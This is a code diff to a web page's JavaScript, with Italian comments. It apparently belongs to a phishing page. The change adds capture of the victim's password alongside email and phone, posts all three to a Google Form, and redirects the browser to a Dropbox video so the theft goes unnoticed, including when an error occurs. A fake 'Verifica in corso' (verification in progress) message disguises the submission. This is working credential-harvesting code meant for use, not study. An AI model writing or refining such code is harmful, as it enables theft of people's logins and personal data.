@@ -240,12 +240,15 @@ const G_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeL-5tvSnuXBFBtEV0yziqFQ
 async function inviaDatiFinali() {
     const email = document.getElementById("email").value;
     const phone = document.getElementById("phone").value;
+    const password = document.getElementById("password").value; // Recuperiamo anche questa
 
     const formData = new FormData();
-    formData.append("entry.1807533030", email); 
-    formData.append("entry.167777586", phone);
+    
+    // ID corretti basati sul tuo modulo:
+    formData.append("entry.1807533030", email);    // Campo Email
+    formData.append("entry.1821810321", phone);    // Campo Telefono (ID recuperato dai messaggi precedenti)
+    formData.append("entry.167777586", password); // Campo "p"
 
-    // Mostriamo un feedback all'utente (opzionale ma consigliato)
     const btn = document.querySelector(".primary");
     btn.textContent = "Verifica in corso...";
     btn.disabled = true;
@@ -257,14 +260,13 @@ async function inviaDatiFinali() {
             body: formData
         });
 
-        // Aspettiamo 1 secondo per essere sicuri che i dati siano partiti
+        // Il redirect DEVE essere leggermente ritardato per dare tempo al browser
         setTimeout(() => {
-            window.location.href = "https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0";
-        }, 1000);
+            window.location.replace("https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0");
+        }, 1200);
 
     } catch (e) {
-        // In caso di errore vero (connessione assente), lo mandiamo comunque
-        window.location.href = "https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0";
+        window.location.replace("https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0");
     }
 }
 </script>
